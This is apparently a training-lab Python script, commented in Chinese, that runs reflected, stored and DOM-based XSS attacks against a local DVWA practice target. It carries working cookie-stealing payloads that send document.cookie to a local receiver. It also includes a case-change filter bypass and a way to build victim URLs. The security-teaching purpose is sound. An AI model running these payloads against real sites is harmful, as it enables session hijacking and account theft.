#!/usr/bin/env python3
"""14 · XSS 三种类型实战：反射 / 存储 / DOM + cookie 窃取接收端

用法:
    python3 xss_lab.py session                          # 登录 DVWA，打印 cookie（喂给 visit.js）
    python3 xss_lab.py attack reflected --level low|medium
    python3 xss_lab.py attack stored  --level low
    python3 xss_lab.py attack dom                       # 打印 DOM 型受害 URL
    python3 xss_lab.py captures [--min 1]               # 查看接收端战果（供脚本断言）

payload 用「把 document.cookie 送到本机接收端」的形式——这正是 XSS 的
真实危害：页面里的脚本能读到非 HttpOnly 的会话 cookie。仅打本地靶场。
"""
import argparse
import re
import sys
import time
from pathlib import Path

import requests

BASE = "http://127.0.0.1:8612"
RECV = "http://127.0.0.1:8600"
ART = Path(__file__).parent / "artifacts"

JS = "new Image().src='%s/steal?c='+encodeURIComponent(document.cookie)" % RECV


def login(level="low"):
    s = requests.Session()
    r = s.get(f"{BASE}/login.php", timeout=5)
    tok = re.search(r"name='user_token' value='([^']+)'", r.text).group(1)
    s.post(f"{BASE}/login.php", timeout=5,
           data={"username": "admin", "password": "password",
                 "Login": "Login", "user_token": tok})
    r = s.get(f"{BASE}/security.php", timeout=5)
    tok = re.search(r"name='user_token' value='([^']+)'", r.text).group(1)
    s.post(f"{BASE}/security.php", timeout=5,
           data={"security": level, "seclev_submit": "Submit", "user_token": tok})
    return s


def cookie_header(s):
    return "; ".join(f"{k}={v}" for k, v in s.cookies.items())


def script_tag(level):
    """low 用标准小写标签；medium 的 str_replace 只过滤小写 '<script>'，大写即绕过。"""
    return f"<script>{JS}</script>" if level == "low" else f"<Script>{JS}</Script>"


def cmd_session(a):
    s = login(level=getattr(a, "level", "low"))
    print(cookie_header(s))
    return 0


def cmd_attack(a):
    s = login(level="low")
    if a.kind == "reflected":
        level = a.level
        if level == "medium":
            s = login(level="medium")
        payload = script_tag(level)
        r = s.get(f"{BASE}/vulnerabilities/xss_r/",
                  params={"name": payload}, timeout=8)
        echoed = payload in r.text
        print(f"[reflect] payload（{level}）：{payload[:70]}…")
        print(f"[reflect] 服务端原样回显：{'是' if echoed else '否'}")
        from urllib.parse import quote
        victim = f"{BASE}/vulnerabilities/xss_r/?name={quote(payload)}"
        print(f"[reflect] 受害 URL：{victim}")
        return 0 if echoed else 1

    if a.kind == "stored":
        payload = script_tag("low")
        r = s.post(f"{BASE}/vulnerabilities/xss_s/", timeout=8,
                   data={"txtName": "victim-note", "mtxMessage": payload,
                         "btnSign": "Sign Guestbook"})
        page = s.get(f"{BASE}/vulnerabilities/xss_s/", timeout=8).text
        stored = payload in page
        print(f"[stored] payload 已提交（{len(payload)} 字符，绕过表单 maxlength）")
        print(f"[stored] 留言板页面含未转义 payload：{'是' if stored else '否'}")
        print(f"[stored] 受害 URL：{BASE}/vulnerabilities/xss_s/")
        return 0 if stored else 1

    if a.kind == "dom":
        payload = script_tag("low")
        from urllib.parse import quote
        # 注意：DOM 型的 sink 里是 decodeURI——它不解码保留字符（;/?:@&=+$,#），
        # 所以这里要用 encodeURI 式编码（保留这些字符原样），否则 payload 解出来是坏的。
        victim = f"{BASE}/vulnerabilities/xss_d/?default=" + \
            quote(payload, safe=";/?:@&=+$,'")
        print(f"[dom] payload 在 URL 参数里，服务端不处理它（encodeURI 式编码）")
        print(f"[dom] 受害 URL：{victim}")
        return 0
    raise SystemExit("未知类型")


def cmd_captures(a):
    log = ART / "receiver.log"
    if not log.exists():
        print(f"[captures] 接收端还没有任何战果（{log} 不存在）")
        return 1
    lines = [l for l in log.read_text(encoding="utf-8").splitlines() if l.strip()]
    print(f"[captures] 共 {len(lines)} 条回调：")
    for l in lines:
        print(f"  {l}")
    ok = len(lines) >= a.min
    print(f"[=] 期望 ≥{a.min} 条：{'满足' if ok else '不足'}")
    return 0 if ok else 1


def main():
    ap = argparse.ArgumentParser(description="XSS 三类型实战（仅本机 DVWA）")
    sub = ap.add_subparsers(dest="cmd", required=True)
    p0 = sub.add_parser("session")
    p0.add_argument("--level", default="low", choices=["low", "medium"])
    p0.set_defaults(func=cmd_session)
    p1 = sub.add_parser("attack")
    p1.add_argument("kind", choices=["reflected", "stored", "dom"])
    p1.add_argument("--level", default="low", choices=["low", "medium"])
    p1.set_defaults(func=cmd_attack)
    p2 = sub.add_parser("captures")
    p2.add_argument("--min", type=int, default=1)
    p2.set_defaults(func=cmd_captures)
    args = ap.parse_args()
    return args.func(args)


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n[!] 已中断", file=sys.stderr)
        sys.exit(130)
